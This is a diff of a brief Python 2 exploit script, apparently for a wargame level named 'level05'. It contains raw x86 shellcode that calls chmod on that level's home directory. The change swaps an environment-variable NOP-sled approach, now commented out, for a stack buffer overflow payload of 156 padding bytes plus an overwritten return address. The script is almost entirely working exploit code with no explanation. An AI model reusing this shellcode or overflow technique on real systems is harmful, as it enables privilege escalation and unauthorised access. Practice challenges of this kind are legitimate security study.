@@ -1,12 +1,13 @@
 import struct
+# set follow-fork-mode child
 
 # chmod /home/users/level05
 shell = '\x31\xc0\x50\x68\x65\x6c\x30\x35\x68\x2f\x6c\x65\x76\x68\x73\x65\x72\x73\x68\x6d\x65\x2f\x75\x68\x2f\x2f\x68\x6f\xb0\x0f\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80'
 
-nop = '\x90' * 0x200
-open("env_shell", "w+").write(nop + shell)
+#nop = '\x90' * 0x200
+#open("env_shell", "w+").write(nop + shell)
 
-# padd = 'a' * 156
-to = struct.pack("<I", 0xffffde8c)
+padd = 'a' * 156
+to = struct.pack("<I", 0xffffddad)
 
-print to * 50
+print padd + to
